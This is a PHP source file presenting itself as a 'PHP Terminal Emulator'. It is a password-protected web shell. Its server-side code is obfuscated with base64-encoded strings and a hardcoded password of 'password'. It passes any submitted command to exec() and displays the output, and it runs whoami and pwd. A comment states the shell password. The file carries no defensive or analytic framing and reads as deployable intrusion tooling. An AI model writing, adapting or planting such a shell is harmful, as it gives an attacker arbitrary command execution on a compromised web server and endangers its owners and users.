<?php $passwd = 'cGFzc3dvcmQ=';$o1=base64_decode($passwd);session_start();if(isset($_POST[base64_decode('Y2xlYXI=')])AND $_POST[base64_decode('Y2xlYXI=')]==base64_decode('Y2xlYXI=')){k0();}if(!isset($_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')])OR!isset($_SESSION[base64_decode('Y29tbWFuZHM=')])){$_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')]=array();$_SESSION[base64_decode('Y29tbWFuZHM=')]=array();$_SESSION[base64_decode('Y29tbWFuZF9yZXNwb25zZXM=')]=array();}$s2=FALSE;$u3=FALSE;if(isset($_POST[base64_decode('cGVyc2lzdF9jb21tYW5kX2lk')])AND is_numeric($_POST[base64_decode('cGVyc2lzdF9jb21tYW5kX2lk')])){$s2=TRUE;$y4=$_POST[base64_decode('cGVyc2lzdF9jb21tYW5kX2lk')];if(count($_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')])==$y4){$u3=TRUE;}else{$_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')][$y4]=!$_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')][$y4];}}$r5='';foreach($_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')]as $p6=>$x7){if($x7){$v8=$_SESSION[base64_decode('Y29tbWFuZHM=')][$p6];if($v8!=''){$r5.=$v8.base64_decode('OyA=');}}}if(isset($_POST[base64_decode('Y29tbWFuZA==')])){$t9=$_POST[base64_decode('Y29tbWFuZA==')];if(!isset($_SESSION[base64_decode('bG9nZ2VkX2lu')])){if($t9==$o1){$_SESSION[base64_decode('bG9nZ2VkX2lu')]=TRUE;$ea=array(base64_decode('V2VsY29tZSwg').str_replace(base64_decode('Cg=='),'',`whoami`).base64_decode('ISE='));}else{$ea=array(base64_decode('SW5jb3JyZWN0IFBhc3N3b3Jk'));}array_push($_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')],FALSE);array_push($_SESSION[base64_decode('Y29tbWFuZHM=')],base64_decode('UGFzc3dvcmQ6IA=='));array_push($_SESSION[base64_decode('Y29tbWFuZF9yZXNwb25zZXM=')],$ea);}else{if($t9!='' AND!$s2){if($t9==base64_decode('bG9nb3V0')){session_unset();$ea=array(base64_decode('U3VjY2Vzc2Z1bGx5IExvZ2dlZCBPdXQ='));}elseif($t9==base64_decode('Y2xlYXI=')){k0();}else{exec($r5.$t9.base64_decode('IDI+JjE='),$ea,$vb);if($vb>0 AND $ea==array()){$ea=array(base64_decode('RXJyb3I='));}}}else{$ea=array();}if($t9!=base64_decode('bG9nb3V0') AND $t9!=base64_decode('Y2xlYXI=')){if($s2){if($u3){array_push($_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')],TRUE);array_push($_SESSION[base64_decode('Y29tbWFuZHM=')],$t9);array_push($_SESSION[base64_decode('Y29tbWFuZF9yZXNwb25zZXM=')],$ea);if($t9!=''){$r5=$r5.$t9.base64_decode('OyA=');}}}else{array_push($_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')],FALSE);array_push($_SESSION[base64_decode('Y29tbWFuZHM=')],$t9);array_push($_SESSION[base64_decode('Y29tbWFuZF9yZXNwb25zZXM=')],$ea);}}}}function k0(){if(isset($_SESSION[base64_decode('bG9nZ2VkX2lu')])){$rc=TRUE;}else{$rc=FALSE;}session_unset();if($rc){$_SESSION[base64_decode('bG9nZ2VkX2lu')]=TRUE;}}?>
/*shell password: password*/<br>/*see $passwd variable in the file*/

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>PHP Terminal Emulator</title>
	<style type="text/css">
		* {
			margin: 0;
			padding: 0;
		}
		body {
			background-color: #000000;
			color: #00FF00;
			font-family: monospace;
			font-weight: bold;
			font-size: 12px;
			text-align: center;
		}
		input, textarea {
			color: inherit;
			font-family: inherit;
			font-size: inherit;
			font-weight: inherit;
			background-color: inherit;
			border: inherit;
		}
		.content {
			width: 80%;
			min-width: 400px;
			margin: 40px auto;
			text-align: left;
			overflow: auto;
		}
		.terminal {
			border: 1px solid #00FF00;
			height: 500px;
			position: relative;
			overflow: auto;
			padding-bottom: 20px;
		}
		.terminal .bar {
			border-bottom: 1px solid #00FF00;
			padding: 2px;
			white-space: nowrap;
			overflow: hidden;
		}
		.terminal .commands {
			padding: 2px;
			padding-right: 0;
		}
		.terminal #command {
			width: 90%;
		}
		.terminal .colorize {
			color: #0000FF;
		}
		.terminal .persist_button {
			float: right;
			border-width: 1px 0 1px 1px;
			border-style: solid;
			border-color: #00FF00;
			clear: both;
		}
	</style>
</head>
<body>
	<div class="content">
		<div class="terminal" onclick="document.getElementById('command').focus();" id="terminal">
			<div class="bar">
				<?php echo`whoami`,base64_decode('IC0g'),exec($r5.base64_decode('cHdk'));?>
			</div>
			<form action="<?php echo $_SERVER[base64_decode('UEhQX1NFTEY=')];?>" method="post" class="commands" id="commands">
				<input type="hidden" name="persist_command_id" id="persist_command_id" />
				<?php if(!empty($_SESSION[base64_decode('Y29tbWFuZHM=')])){?>
				<div>
					<?php foreach($_SESSION[base64_decode('Y29tbWFuZHM=')]as $p6=>$t9){?>
					<input type="button" value="<?php if($_SESSION[base64_decode('cGVyc2lzdF9jb21tYW5kcw==')][$p6]){?>Un-Persist<?php }else{?>Persist<?php }?>" onfocus="this.style.color='#0000FF';" onblur="this.style.color='';" onclick="toggle_persist_command(<?php echo $p6;?>);" class="persist_button" />
					<pre><?php echo base64_decode('JCA='),$t9,base64_decode('Cg==');?></pre>
					<?php foreach($_SESSION[base64_decode('Y29tbWFuZF9yZXNwb25zZXM=')][$p6]as $kd){?>
					<pre><?php echo htmlentities($kd),base64_decode('Cg==');?></pre>
					<?php }?>
					<?php }?>
				</div>
				<?php }?>
				$ <?php if(!isset($_SESSION[base64_decode('bG9nZ2VkX2lu')])){?>Password:
				<input type="password" name="command" id="command" />
				<?php }else{?>
				<input type="text" name="command" id="command" autocomplete="off" onkeydown="return command_keyed_down(event);" />
				<input type="button" value="Persist" onfocus="this.style.color='#0000FF';" onblur="this.style.color='';" onclick="toggle_persist_command(<?php if(isset($_SESSION[base64_decode('Y29tbWFuZHM=')])){echo count($_SESSION[base64_decode('Y29tbWFuZHM=')]);}else{echo 0;}?>);" class="persist_button" />
				<?php }?>
			</form>
		</div>
	</div>
	<script type="text/javascript">
		
		<?php $qe=array();if(!empty($_SESSION[base64_decode('Y29tbWFuZHM=')])){foreach($_SESSION[base64_decode('Y29tbWFuZHM=')]as $t9){$df=str_replace(base64_decode('XFw='),base64_decode('XFxcXA=='),$t9);$df=str_replace(base64_decode('XCc='),base64_decode('XFxcJw=='),$t9);$qe[]=$df;}}?>
		
		var previous_commands = ['', '<?php echo implode(base64_decode('XCcsIFwn'),$qe)?>', ''];
		
		var current_command_index = previous_commands.length - 1;
		
		document.getElementById('command').select();
		
		document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
		
		function toggle_persist_command(command_id)
		{
			document.getElementById('persist_command_id').value = command_id;
			document.getElementById('commands').submit();
		}
		
		function command_keyed_down(event)
		{
			var key_code = get_key_code(event);
			if (key_code == 38) { //Up arrow
				fill_in_previous_command();
			} else if (key_code == 40) { //Down arrow
				fill_in_next_command();
			} else if (key_code == 9) { //Tab
				
			} else if (key_code == 13) { //Enter
				if (event.shiftKey) {
					toggle_persist_command(<?php if(isset($_SESSION[base64_decode('Y29tbWFuZHM=')])){echo count($_SESSION[base64_decode('Y29tbWFuZHM=')]);}else{echo 0;}?>);
					return false;
				}
			}
			return true;
		}
		
		function fill_in_previous_command()
		{
			current_command_index--;
			if (current_command_index < 0) {
				current_command_index = 0;
				return;
			}
			document.getElementById('command').value = previous_commands[current_command_index];
		}
		
		function fill_in_next_command()
		{
			current_command_index++;
			if (current_command_index >= previous_commands.length) {
				current_command_index = previous_commands.length - 1;
				return;
			}
			document.getElementById('command').value = previous_commands[current_command_index];
		}
		
		function get_key_code(event)
		{
			var event_key_code = event.keyCode;
			return event_key_code;
		}
		
	</script>
	<form action="<?php echo $_SERVER[base64_decode('UEhQX1NFTEY=')];?>" method="post">
		<input type="hidden" name="clear" value="clear" />
		<input type="submit" value="Clear" onfocus="this.style.color='#0000FF';" onblur="this.style.color='';" />
	</form>
</body>
</html>
